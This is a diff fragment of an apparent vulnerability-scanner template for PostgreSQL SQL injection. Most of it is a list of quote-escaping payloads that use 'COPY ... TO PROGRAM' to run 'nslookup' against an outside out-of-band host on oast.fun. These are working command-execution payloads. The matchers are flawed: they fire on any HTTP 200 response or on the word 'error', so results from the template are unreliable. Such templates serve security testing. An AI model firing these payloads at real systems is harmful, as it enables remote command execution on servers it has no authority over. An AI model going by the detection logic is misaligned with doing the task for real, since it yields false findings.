+        - ";(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - ");(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "));(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - ")));(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "';(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "');(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "'));(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "')));(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "\";(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "\");(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "\"));(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "\")));(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "`;(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "`);(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "`));(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+        - "`)));(COPY+(SELECT+'')+TO+PROGRAM+'nslookup+jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.jsijypithvwluehxhpgwb2wkoikdmnv7b.oast.fun')+-"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "error"
+          - "sql"
+          - "syntax"
+          - "postgresql"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Server: PostgreSQL"
+          - "X-Powered-By: PHP"
+        part: header
+        condition: or
+        case-insensitive: true
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
+      - type: regex
+        name: response_data
+        part: body
+        regex:
+          - "(error|sql|syntax|postgresql)[^&\\s\"']+"
+        group: 1
